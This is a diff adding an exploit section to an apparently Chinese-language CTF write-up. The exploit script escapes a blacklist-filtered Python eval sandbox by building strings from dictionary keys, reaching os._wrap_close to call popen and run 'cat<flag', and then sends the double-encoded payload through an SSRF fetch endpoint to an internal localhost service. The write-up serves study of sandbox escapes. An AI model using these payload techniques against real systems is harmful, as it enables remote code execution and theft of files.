@@ -175,5 +175,46 @@ def safe_eval():
 3. 最后一个黑名单过滤的沙箱逃逸了。首先数字只有`0,1`所以肯定不是常规的利用`subclasses[x]`。我们这里利用`dic+lit`的"取键"操作来绕过了”，‘。
 ## exp
 ```python
+import requests
+import urllib.parse
 
+TARGET_URL = "http://challenge.ilovectf.cn:30208/"
+
+cmd_payload = (
+    "lit(dic(cat=1)).pop()"           # "cat"
+    ".__add__(lit.__base__.__str__(lit).__getitem__(0))" # "<"
+    ".__add__(lit(dic(flag=1)).pop())" # "flag"
+)
+
+# 最终的 Payload 结构
+payload = (
+    # 1. 找到 os._wrap_close 类
+    "lit(i for i in lit.__base__.__subclasses__()if lit(dic(wrap_close=1)).pop()in lit.__base__.__str__(i)).pop()"
+    # 2. 初始化并获取 popen 函数
+    ".__init__.__globals__.get(lit(dic(popen=1)).pop())"
+    # 3. 执行命令 (cat<flag)
+    f"({cmd_payload})"
+    # 4. 读取结果
+    ".read()"
+)
+
+print(f"[*] 正在尝试执行: cat<flag")
+print(f"[*] Payload 长度: {len(payload)} (限制 304)") # 检查长度，这很重要
+
+# 1. 全量编码
+# pass_1_encode = "".join("%{0:0>2x}".format(ord(char)) for char in payload)
+pass_1_encode = "".join(f"%{ord(c):02x}" for c in payload)
+# 2. 双重编码 (% -> %25)
+pass_2_encode = pass_1_encode.replace("%", "%25")
+
+# 3. 拼接
+full_url = f"{TARGET_URL}/fetch?url=http://vnctf.@localhost:8080/__internal/safe_eval?hi={pass_2_encode}"
+
+print(pass_2_encode)
+# 4. 发送
+try:
+    res = requests.get(full_url)
+    print(f"\n[+] cat<flag 执行结果:\n{res.text}")
+except Exception as e:
+    print(f"[-] Error: {e}")
 ```
